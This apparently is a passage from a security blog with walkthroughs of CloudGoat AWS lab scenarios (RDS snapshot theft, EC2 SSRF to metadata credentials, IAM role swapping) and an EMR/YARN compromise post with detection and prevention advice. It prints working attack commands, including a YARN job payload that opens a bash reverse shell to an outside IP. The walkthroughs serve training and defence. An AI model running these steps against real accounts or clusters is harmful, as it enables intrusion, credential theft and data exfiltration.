snapshot.\naws --profile cal rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidg25jfhzv9a --db-snapshot-identifier yogi-db-snap After running the command above we get an output that shows us that the command was successful, and that the current status is creating.\nBefore we can restore our snapshot to an RDS instance that we control the snapshot needs to be completed. We can check that by using the describe-db-snapshots command.\naws --profile cal rds describe-db-snapshots --db-snapshot-identifier yogi-db-snap After executing that command we get the output below, which tells us that we do not have permissions to check on the status of our db.\nHopefully, this is not a sign of things to come. Since we do not know if the snapshot is complete the only option we have is to wait until we think its done. After that we can attempt to restore it, and hopefully we will have enough permissions to do so.\nTo restore the database we need the following bits information that we discovered earlier:\nRDS Public Subnet Name: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a VPC Security group that grants us access: sg-096bb9f39aaa9334d We can use the information above and build the command below to start the build process:\naws --profile cal rds restore-db-instance-from-db-snapshot --db-instance-identifier yogidbinstance --db-snapshot-identifier yogi-db-snap --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a --publicly-accessible --vpc-security-group-ids sg-096bb9f39aaa9334d The output should return something similar to the image below with the \u0026lsquo;DBInstanceStatus\u0026rsquo; of creating\nAfter a couple of minutes we can check the status of our creation with:\naws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq \u0026#39;.DBInstances[] .DBInstanceStatus\u0026#39; Once the output shows that the db is \u0026lsquo;available\u0026rsquo; we can attemp to connect. The connection address was given to us when we ran the restore command above, but if you lost that we can get the information with the following command:\naws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq \u0026#39;.DBInstances[] .Endpoint\u0026#39; We can use psql to attempt a connection to the db host:\npsql -h yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p 5432 Great, we have a connetion! Now we need to connect with the default cgadmin and the admin password. However, before we do that we need to set the password to something we know. To do that we need to run the modify-db-instance command:\naws --profile cal rds modify-db-instance --db-instance-identifier yogidbinstance --master-user-password yogibear We will receive an output that shows:\n\u0026#34;PendingModifiedValues\u0026#34;: { \u0026#34;MasterUserPassword\u0026#34;: \u0026#34;****\u0026#34; }, Now lets try to connect to our RDS instance one more time.\npsql postgresql://cgadmin@yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com:5432/postgres We can list the databases with \\l\nLooking at the output, the securedb looks interesting. Lets connect to it, list the tables, and print it all to the screen.\n\\c securedb \\dt SELECT * FROM sensitive_information; Awesome! We succesfull gained access to the secret information within the RDS database.\nAlternative Path There is another way to gain access to the secrets held in the database. I have not worked through that path. Once I do I will update this document.\nPrevention Where did the owner of this account go wrong? There are a few places where this attack could have be stopped. Lets dive into them.\nOur initial access was through the solo user. Does that user need static keys? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. Does solo need access to codebuild? Chances are they do, the permissions seemed to be fairly tightly scoped around that service. But if they do not, removing those capabilities would be good. Within the codebuild project we came across keys for the calrissian user. Those keys should not exist within this project. Assuming the keys were placed there to grant the Linux container associated with this project access to RDS or other portions of AWS, there are better ways to do this. Assigning a role to the node where the container lives would be the best option. If the container does not live within aws, using a secrets manager is the next best thing. The calrissian user seemed to have a mismash of permissions in RDS. If these permission are not all required they should be removed. Specifically the modify-db-instance, and create-db-snapshot permissions. By fixing one of these things or all of them, it would have effected our ability to access the secret data within the database.\nFrom a logging and alerting point of view, we probably made several commands that were not \u0026rsquo;normal\u0026rsquo; for the solo and calrissian users to make. By alerting on this odd activity the response team could have detected us and shut the attack down. Additionally if there would have been a configuration management solution to monitor for RDS instances being made public and preventing it. It would have made our attack much more complicated.\n","permalink":"https://jellyparks.com/posts/codebuild-secrets/","summary":"Cloud Goat codebuild secrets scenario walkthrough","title":"codebuild_secrets"},{"content":" According to the official documentation for this scenario (here) the overall goal is to \u0026ldquo;Invoke the \u0026ldquo;cg-lambda-[ CloudGoat ID ]\u0026rdquo; Lambda function.\u0026rdquo;\nScenario Setup To get everything up we just have to run:\npython3 cloudgoat.py create ec2_ssrf Once the build process compeletes we are provided with a set of credentials for the Solus user. We should validate that the credentials work. The get caller identity is a great command for this and is the equivilant to running whoami.\naws --profile solus sts get-caller-identity A response should come back with letting us know that we are the Solus user.\n{ \u0026#34;UserId\u0026#34;: \u0026#34;AIDASDFASFSADFBBAJMXFY3\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;121212121212\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:user/solus\u0026#34; } Solus In the real world, we probably wouldn\u0026rsquo;t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let\u0026rsquo;s start doing basic enumeration and see if we can determine what things we have access to. To do this we\u0026rsquo;ll run the following set of commands just to poke at a few of the more common services:\naws --profile solus s3 ls aws --profile solus ec2 describe-instances aws --profile solus iam list-roles aws --profile solus lambda list-functions All of those commands result in an access denied error with the exception of the lambda request\nThe lambda call returns details for one function called cg-lambda-cgidheuaifn6y6. Looking at the output pictured below we can see that there is a second set or credentials stored as environment variables for this function.\nAdditionally, we can see that the function has a role associated with it. This means that the function more than likely has permissions to make additional calls. Before switching to the new credetntials let\u0026rsquo;s grab the Lambda function and see if there are any additional details that may be of use. We can do that by running the following command:\naws --profile solus lambda get-function --function-name cg-lambda-cgidheuaifn6y6 This will produce the output below. Which contains a link where we can download a zipped copy of the function code.\nAfter downloading, and extracting the code we discover it\u0026rsquo;s a simple python script which returns the message You win!. This is the function that we need to invoke in order to \u0026lsquo;win\u0026rsquo; the challenge. We will see if we can run the function with the Solus user in a moment, but first let\u0026rsquo;s look at how we could leverage Pacu to grab the function for us.\nOnce Pacu is configured with Solus credentials we can run the lambda__enum enumeration function for the us-east-1 region. The output from that command is below:\nAs expected one function was discovered. When we run the data Lambda command in Pacu we can see that Pacu has already requested the function data for us and we have a download link to grab the code. The enum__lambda module automatically makes the list-functiosn call and the get-function call for each function discovered. This is helpful if there are a large number of functions to parse through.\nNow, let\u0026rsquo;s see if we can invoke the function and win this challenge with our Solus user credentials. We can invoke the function with the following command\naws --profile solus lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt Unfortunatly for us, it looks like we are not allowed run invoke this function. We received an Access Denied error. Let\u0026rsquo;s backtrack a bit and use the credentials we discovered in the function environment variables. Once they\u0026rsquo;ve been added to the credentials file we can confirm that they by running sts get-caller-identity. That command produces that out below:\n{ \u0026#34;UserId\u0026#34;: \u0026#34;AIDA5X73I5MBOZ4A4P4DG\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;121212121212\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:user/wrex\u0026#34; } Wrex It appears that the credentials which were stored as environment variables for the function are credentials for the \u0026lsquo;wrex\u0026rsquo; user account. Perhaps this user can invoke the function? Lets give it a shot.\naws --profile wrex lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 /tmp/outfile.txt Once again, access denied. Let\u0026rsquo;s begin the enumeration process to determine what these keys are allowed to do. We can run the same commands we ran earlier to get a better idea what these credentials are allowed to do.\naws --profile wrex s3 ls aws --profile wrex ec2 describe-instances aws --profile wrex iam list-roles aws --profile wrex lambda list-functions All of the commands fail with the exception of the ec2 describe-instances command. Looking at the output below we can see that the ec2 instance has a public IP and according to the security group looks to be listening on port 80. We can also see the instance has an instance profile associated with it which means there are more than likely permissions that we can leverage to gain further access within aws.\ncurl Curling the url results initially in an error:\nThe error stats that URL must be a string, not undefied. Perhaps this is a parameter we can pass in? Running the following command results in the same error:\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?URL\\=asdf.com What if we tried it all lower case? Perhaps the error is uppercasing the parameter and that is causing the error.\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=asdf.com Awesome, we get the output pictured below. It looks like this application is proxying web traffic for us.\nIf that is the case then any url we enter into the url parameter this application will fetch for us. Let\u0026rsquo;s see if we can talk to the meta-data service for this instance.\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=http://169.254.169.254/latest/ This results in the output below:\nKnowing we can talk to the meta data endpoint lets see if we can pull the credentials off of this ec2 instance. We can accomplish this with the following command:\ncurl http://ec2-34-229-224-250.compute-1.amazonaws.com/\\?url\\=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidheuaifn6y6 The server responds with everything we need to impersonate this instance and dig deeper into aws.\nIt\u0026rsquo;s worth mentioning, while we jumped straight to pulling creds from this instance the user-data endpoint can hold very valuable information.\nUsing the credentials from the instance we can run the get get-caller-identity command and make sure they are valid. We get the output below:\nOnce again, as we do with any new set of credentials, let\u0026rsquo;s see what all we can do with them.\naws --profile ec2 s3 ls aws --profile ec2 ec2 describe-instances aws --profile ec2 iam list-roles aws --profile ec2 lambda list-functions Much like our previous enumeration attempts, everything failed except for one call. In this case the s3 ls command was successful and we get the name for every bucket in the account:\nRunning the s3 ls command on one of the buckets we get the response below showing a text file called \u0026lsquo;admin-user.txt\u0026rsquo;. This sounds potentially promising. Let\u0026rsquo;s download the file.\nTo download the file we\u0026rsquo;ll run the s3 cp command:\naws --profile ec2 s3 cp s3://cg-secret-s3-bucket-cgidheuaifn6y6/admin-user.txt /tmp/admin-user.txt Once the file is copied, we can examine the data within it. The file appears to hold a set of user credentials. Based on the name of the file, it is safe to assume that these will be admin credentials. Perhaps the account owner is storing them here as a backup or perhaps this key is a honey key and as soon as we use it the organizations security team will be alerted. Only one way to find out.\naws --profile s3_cred sts get-caller-identity { \u0026#34;UserId\u0026#34;: \u0026#34;AIDA5X73WERWERGXKIKBZ\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;121212121212\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:user/shepard\u0026#34; } Perfect! We now have the \u0026lsquo;Shepard\u0026rsquo; user\u0026rsquo;s credentials. Lets see if we can invoke the lambda function. We can do that with the command below, which produces the 200 output.\naws --profile shepard lambda invoke --function-name=cg-lambda-cgidheuaifn6y6 out.txt { \u0026#34;StatusCode\u0026#34;: 200, \u0026#34;ExecutedVersion\u0026#34;: \u0026#34;$LATEST\u0026#34; } It would appear that the command executed successfully. Reading the output text file we\u0026rsquo;re greated with You win! This indicates that we have completed the challenge. Poking around a bit more and it becomes clear that the Shepard user is an admin level account with full access to do anything within the account.\nPrevention So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.\nThe first and probably the biggest thing that whould have prevented this is: do not store credentials as unencrypted environment variables. In the case of this script the credentials were aws access keys. Those should never be there. Let the script assume a role to gain access to resources it needs. This one thing would have stopped this entire attack path dead in its tracks. The ec2 instance is listening on port 80 to the entire world. Does it need to? Could it be scoped to a limited number of addresses? If so that should be done. If that isn\u0026rsquo;t possible because of a business need that it exists, thats fine but we need some controls. The website should not exist in its current state. The first goal should be to work with the business to understand what they are trying to accomplish. If possible removing the proxy page would be ideal. Does the ec2 instance need access to s3? From what we observed there was no real purpose for the instance to be able to directly access s3. If this is the case, can we remove the profile association? Without a profile, the instance would no longer be able to talk to aws services in the same way. This would drastically limit the impact radius if it does become compromised. The s3 bucket storing a backup copy of the Shepards credentials should be removed. This should never ever exist. These credentials should be stored in a secure password vault and not in a text file in a s3 bucket. Detection What about GuardDuty? That should detect all of this right? The short answer is sort of, but it depends on who is looking. Since we used access keys for all of our access it limits the scope of which alerts would fire. The only alert that would potentially fire for all of the activity we conducted would have been the UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration. When we exfiled the credentials from the Ec2 we ran all of our AWS commands from an IP address outside of AWS. This would trigger this particular alert. The Recon:IAMUser/UserPermissions alert may have also fired since we queried iam a few times attempting to list the roles within the account. Thats it, no other alerts would have been triggered.\nSo how else could we catch this activity? One way would be to base line user activity, and if anyone deviates from that fire an alert. Another possible way to detect this behavior would be to add alerts for specific API calls. If iam listRoles isn\u0026rsquo;t common in your organization you could fire on that. Perhaps GetCallerIdentity is not used frequently and you could alert on that. If those don\u0026rsquo;t work, building something which thresholds API calls and once a certain amount of \u0026lsquo;potentially malicious\u0026rsquo; calls are made triggers an alert to fire. Example: ListRoles isn\u0026rsquo;t bad when its alone, but if GetCallerIdentity fires, and then within 5 minutes ListRoles is, perhaps thats enough to trip an alert.\nWhat if the Admin access keys we found were honey tokens. As soon as we tried to use those keys the security team would have been notified and the race would be on.\n","permalink":"https://jellyparks.com/posts/ec2-ssrf/","summary":"Cloud Goat ec2 ssrf scenario walkthrough","title":"ec2_ssrf"},{"content":" I recently had the opportunity to dig deeper into the Elastic Map Reduce (EMR) service in AWS. According to the official Amazon docs (here) \u0026ldquo;\u0026hellip;EMR is a manged cluster platform that simlifies running big data frameworks\u0026hellip;\u0026rdquo; Full disclosure I have virtually zero experience with big data and big data platforms. The closest I\u0026rsquo;ve gotten to that space is storing data in S3 and searching it with Athena. Oh, I also sometimes search enterprise Splunk without specifying an index or sourcetype. That counts right?\nThe reason I was digging into EMR was not to learn more about big data, hadoop, spark, etc. But instead it was to answer a few simple questions. How would someone compromise a cluster, and on the flip side, how could you detect it was compromised and what the attackers did after compromise.\nSetting Up a Cluster Amazon has done an amazing job at making it really easy to deploy an EMR cluster. In fact its just a few clicks and its up. Within the EMR section select create to create a cluster. Once the Create Cluster - Quick Options page loads configure your cluster to meet your needs. For this example select release emr-6.0.0 with Spark, Yarn, and Zeppelin.\nSelect the key pair to use for the instances which will be part of the cluster, and then click the Create Cluster button. A screenshot of the configuration setup is below.\nThe instances will spin up fairly quickly, the cluster will become fully operational in about 3-5 minutes. Once it\u0026rsquo;s ready the cluster status will be Waiting, Cluster Ready the green dot next to the cluster name will be solid green as pictured below\nIn order to access the cluster make sure to add a security group to the primary node which gives access to 8088. DO NOT EXPOSE THIS TO THE ENTIRE INTERNET. I cannot stress this enough, do not expose the port to entire Internet, only allow access from a trusted IP.\nCompromising EMR As it turns out with improper security configurations an EMR deployment can be compromised with a couple of curl requests or a quick python script.\nThe first request we need to make constructs a new application for us, and returns various meta details about the applicaiton.\ncurl --request POST \u0026#39;PRIMARYHOST:8088/ws/v1/cluster/apps/new-applicaion\u0026#39; If successful we get a response similar to the one below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { \u0026#34;application-id\u0026#34;: \u0026#34;application_1590702911576_0016\u0026#34;, \u0026#34;maximum-resource-capability\u0026#34;: { \u0026#34;memory\u0026#34;: 12288, \u0026#34;vCores\u0026#34;: 4, \u0026#34;resourceInformations\u0026#34;: { \u0026#34;resourceInformation\u0026#34;: [ { \u0026#34;maximumAllocation\u0026#34;: 9223372036854775807, \u0026#34;minimumAllocation\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;memory-mb\u0026#34;, \u0026#34;resourceType\u0026#34;: \u0026#34;COUNTABLE\u0026#34;, \u0026#34;units\u0026#34;: \u0026#34;Mi\u0026#34;, \u0026#34;value\u0026#34;: 12288 }, { \u0026#34;maximumAllocation\u0026#34;: 9223372036854775807, \u0026#34;minimumAllocation\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;vcores\u0026#34;, \u0026#34;resourceType\u0026#34;: \u0026#34;COUNTABLE\u0026#34;, \u0026#34;units\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;value\u0026#34;: 4 } ] } } } The main field we care about is the application-id field. The resource information is also important. We need to make sure that we do not request resources beyond the capacity of the resources allocted for the applications.\nThe next step is to execute the application. Within an exection request, we define additional parameters for the job. There are all kinds of configuration options such as resources to consume, commands to run, and a lot of other things that are well beyond the scope of this article. The POST request below will call our application and have it run a simple reverse shell:\ncurl --request POST \u0026#39;PRIMARYHOST:8088/ws/v1/cluster/apps\u0026#39; \\ --header \u0026#39;Accept: application/json\u0026#39; \\ --header \u0026#39;Content-Type: application/json\u0026#39; \\ --data-raw \u0026#39;{ \u0026#34;max-app-attempts\u0026#34;:2, \u0026#34;am-container-sepc\u0026#34;:{ \u0026#34;commands\u0026#34;:{ \u0026#34;command\u0026#34;:\u0026#34;/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/3.94.211.164/6767 0\u0026gt;\u0026amp;1\u0026#34;\u0026#34; } }, \u0026#34;application-id\u0026#34;:\u0026#34;application_1590702911576_0016\u0026#34;, \u0026#34;application-type\u0026#34;:\u0026#34;YARN\u0026#34;, \u0026#34;application-anem\u0026#34;:\u0026#34;yupyup\u0026#34; }\u0026#39; Once the curl request is made to run the application we can expect a 202 response with no data. A 202 response means the application run request was submitted successfully. It DOES NOT mean the application ran successfully. If there are any configuration errors or other errors the response is still going to be a 202. Just because the applicaiton was submitted successfully does not mean that it will be processed and executed succesfully.\nIn the web GUI at http://PRIMARYHOST:8088/cluster we see that the application ID we called to run will now have an execution history. The user will be dr.who because we created and called the application without authenticating. The other columns have details about various things such as the start times, launch times, etc. Even though the \u0026lsquo;State\u0026rsquo; and \u0026lsquo;FinalStatus\u0026rsquo; columns may say failed the shell code within the application was probably ran.\nLogging As an attacker we can confirm if this worked by checking to see if we have a shell from one of the nodes within the cluster, but how can we as defenders tell if the execution was successful? Good news, all of the activity above is logged. By digging into the logs a bit we should be able to tell what commands were executed and where they were executed at.\nWhen we setup the cluster we enabled logging to a S3 folder. All of our applications will log to this folder. If everything was left to the defaults the logging folder will be something similar to this: s3://aws-logs-ACCOUNT-us-east-1/elasticmapreduce/CLUSTER ID. Within this folder we can pull container logs out for each application. They\u0026rsquo;ll be in a subfolder similar to this /containers/application_1590702911576_0016/container_1590702911576_0016_02_000001/launch_container.sh.gz\nThe launch_container.sh log will have exection details for the application when it was called. In the log output below we can see that the last line contains the reverse shell code that we included in the POST request above when we ran our malicious applicaiton.\n... # Creating copy of launch script cp \u0026#34;launch_container.sh\u0026#34; \u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh\u0026#34; chmod 640 \u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/launch_container.sh\u0026#34; # Determining directory contents echo \u0026#34;ls -l:\u0026#34; 1\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\u0026#34; ls -l 1\u0026gt;\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info\u0026#34; echo \u0026#34;find -L . -maxdepth 5 -ls:\u0026#34; 1\u0026gt;\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0015/container_1590702911576_0015_01_000001/directory.info\u0026#34; find -L . -maxdepth 5 -ls 1\u0026gt;\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\u0026#34; echo \u0026#34;broken symlinks(find -L . -maxdepth 5 -type l -ls):\u0026#34; 1\u0026gt;\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\u0026#34; find -L . -maxdepth 5 -type l -ls 1\u0026gt;\u0026gt;\u0026#34;/var/log/hadoop-yarn/containers/application_1590702911576_0016/container_1590702911576_0016_01_000001/directory.info\u0026#34; echo \u0026#34;Launching container\u0026#34; exec /bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/3.94.211.164/6767 0\u0026gt;\u0026amp;1\u0026#34; At this point we know what was ran, but we don\u0026rsquo;t know which node the malicious code was executed. This is going to be critical to discover so that we can conduct further analysis of the system to see what else the attacker did. To do this we need to change to a new directory within S3 to find the node logs. Node logs can be found here: node/NODE INSTANCE ID/applications/hadoop-yarn\nThese logs are local logs for each instance in the cluster and show all of the application submissions. A sample output is below.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 2020-06-20 20:09:04,277 INFO SecurityLogger.org.apache.hadoop.ipc.Server (Socket Reader #1 for port 8041): Auth successful for appattempt_1590702911576_0016_000001 (auth:SIMPLE) 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Start request for container_1590702911576_0016_01_000001 by user dr.who 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl (IPC Server handler 32 on default port 8041): Creating a new application reference for app application_1590702911576_0016 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from NEW to INITING 2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger (IPC Server handler 32 on default port 8041): USER=dr.who IP=172.31.18.33 OPERATION=Start Container Request TARGET=ContainerManageImpl RESULT=SUCCESS APPID=application_1590702911576_0016 CONTAINERID=container_1590702911576_0016_01_000001 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl (NM ContainerManager dispatcher): Application application_1590702911576_0016 transitioned from INITING to RUNNING 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices (NM ContainerManager dispatcher): Got event CONTAINER_INIT for appId application_1590702911576_0016 2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService (NM ContainerManager dispatcher): Initializing container container_1590702911576_0016_01_000001 2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler (NM ContainerManager dispatcher): Starting container [container_1590702911576_0016_01_000001] 2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl (NM ContainerManager dispatcher): Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING 2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (NM ContainerManager dispatcher): Starting resource-monitoring for container_1590702911576_0016_01_000001 2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): container_1590702911576_0016_01_000001\u0026#39;s ip = 172.31.22.26, and hostname = ip-172-31-22-26.ec2.internal 2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl (Container Monitor): Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available. 2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl (Node Status Updater): NM node labels {} were not accepted by RM and message from RM : null On line 9 in the logs above we can see that the anonymous user \u0026lsquo;dr.who\u0026rsquo; requested to start a container, the application ID, and the container ID for the particular request. On line 27 we can see the node within our cluster which ran the malicious application.\nAdditional logs can be found on the nodes themselves. Another way we can see activity is by pulling the hadoop-yarn-resourcemanager logs out of the primary server.\nWithin this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container container_1590702911576_0016_01_000001 work to the 172.31.22.26 host. This is a great way to determine which host(s) the malicious activity occured on.\n2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode (SchedulerEventDispatcher:Event Processor): Assigned container container_1590702911576_0016_01_000001 of capacity memory:32, vCores:1 on host ip-172-31-22-26.ec2.internal:8041, which has 1 containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:\n2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger (qtp677217562-27): USER=dr.who OPERATION=Submit Application Request TARGET=ClientRMService RESULT=SUCCESS APPID=application_1590702911576_0016 QUEUENAME=default Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.\nNext Steps Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it\u0026rsquo;s hard to say exactly what occured or which nodes were potentially compromised.\nPrevention Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert Port Probe EMR Unprotected Port. That will fire if someone scans a sensitive port (8088).\nAdditional Resources Additional references, I leaned on these heavily while trying to better understand this space:\nHadoop YARN: An Assessment of the Attack Surface and Its Exploits Don\u0026rsquo;t let Dr.Who hijack your EMR cluster Hadoop Yarn hack? ","permalink":"https://jellyparks.com/posts/emr-security-woes/","summary":"Walkthrough of Elastic Map Reduce compromise, and why it should never be directly exposed to the Internet.","title":"emr_security_woes"},{"content":" Once the scenario is creation process completes we are presented with a set of access keys for a user account \u0026lsquo;kerrigan\u0026rsquo;\nwhoami First lets make sure the credentials that we have obtained are valid:\naws sts get-caller-identity --profile xxx |jq Perfect, looks like the credentials work. Now, what can they do?\nWhat can I do? Lets use pacu to brute force some permissions. We can do this by running:\nrun iam__bruteforce_permissions Once the command completes we see the output below:\nOverall the credentials are fairly limited. But it does look like we have the ability to learn about ec2 instances with the describe command. Lets bounce back to the aws cli and run:\naws ec2 describe-instances |jq We get an output thatshows us details about the instances within the us-east region of this account. Lets clean this up a little bit just for fun.\naws --profile kerrigan ec2 describe-instances |jq -r \u0026#39;.Reservations[0].Instances[].InstanceId,.Reservations[0].Instances[].SecurityGroups[].GroupName,.Reservations[0].Instances[].NetworkInterfaces[].Association[]\u0026#39; *Note in the command above I set the Reservations to the value in the first index. To see all instances leave the brackets empty \u0026lsquo;[]\u0026rsquo;\nThis cleans up the verbose output and prints the instance id, security groups, and some networking details about the instance\nLets see what else our permissions can do. We\u0026rsquo;ll start with the instance profiles command. According to Pacu we have rights to invoke this command.\naws iam list-instance-profiles |jq Looking at the output below we see a profile with the \u0026lsquo;cg-ec2-meek-role\u0026rsquo; associated with it.\nLets use pacu to see what instances,security groups, vpcs, and subnets exist within the environment:\nrun ec2__enum --region=us-east-1 Looking at the output we can see that there are currently 4 instances in the region as well as additional information that may become useful.\nWithin Pacu running the data command will dump all of the data from the current session. This will include all of the details we just enumerated about the EC2\u0026rsquo;s within the account.\nLets head back to the aws cli and run the ec2 describe call again. This time instead of jq we will just print the output to a table.\naws --profile kerrigan ec2 describe-instances --output table Looking at the output we can see that there is an ec2 and one of the tags is that it is a super critical server.\nMore Enumeration Considering everything that we\u0026rsquo;ve seen up to this point:\nA critical instance exists We can perform several ec2 tasks We do have some limited iam rights There seems to be some potential for us to create an instance. Lets use Pacu to see if we have any additional iam permissions that could be of use.\nrun iam__enum_users_roles_policies_groups In the output below it looks like we do not have permissions to make the: list_users, list_groups, or list_policies calls. We do however have permissions to list roles within the account.\nLets dig into those a big more. This can be done by either running the data command from within Pacu or by running the following command via the aws cli:\naws --profile kerrigan iam list-roles | jq \u0026#39;.Roles[].RoleName\u0026#39; Considering the role we saw associated with the ec2 instance earlier was called meek it\u0026rsquo;s interesting to see another role with the name of mightly. Lets dig into that a bit more. Instead of making another iam list-roles call to AWS, lets just use the existing data within Pacu by running the data command.\nIn the picture above we can see that the mighty role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and the profile can be associated with an ec2 instance.\nConsidering we have permissions into describing instalnce profile associates, perhaps we also have the ability to associate different roles to a profile. Lets see if we can attach the mighty role to the ec2 profile\nOnly one role can be associated with an ec2 instance profile at a time. To begin we will see if we can remove the existing meek role from the profile. We need to pieces of information in order to remove a role from an instance profile. The role name we want to remove, and the profile we want to remove it from. Luckily we know both of those bits of information from our enumeration.\nRole: cg-ec2-meek-role-cgidawtm15fqxm Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-meek-role-cgidawtm15fqxm If the command is successful, there will be no output, if it fails, it squawks. We can confirm it as successful by running the list-instance-profiles command again.\nIn the output above we see the meek instance profile with no roles associated with it. Great! Now lets try associating the mighty role with the meek instance profile. In order to do this we need two pieces of information, the role name, and the instance profile name.\nRole: cg-ec2-mighty-role-cgidawtm15fqxm Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-mighty-role-cgidawtm15fqxm Similar to the output when we removed the role from the profile, there will be no output if successful. However running the list-instance-profiles command again we can see that the mighty role has been associated with the meek instance profile.\nPerfect! We now have the mighty role associated with the meek profile.\nMake an ec2 Lets create our own ec2 and see if we can associate the meek instance profile with the now might role attached to an ec2 instance that we can gain access to. In order to create an ec2 we need several pieces of information:\nssh key security group ids subnet id image-id instance-type First we need a key pair the command below will create the ssh key named totes-legit, parses it with jq to just show the key details, and then sends the output into a file called totes-legit:\naws --profile kerrigan ec2 create-key-pair --key-name totes-legit |jq -r \u0026#39;.KeyMaterial\u0026#39; \u0026gt; ~/.ssh/totes-legit Next we need to find a security group that fits our needs, or see if we can build our own. After all what use is an instane if we cannot connect to it. We can use data from Pacu or we can make another call to aws\naws --profile kerrigan ec2 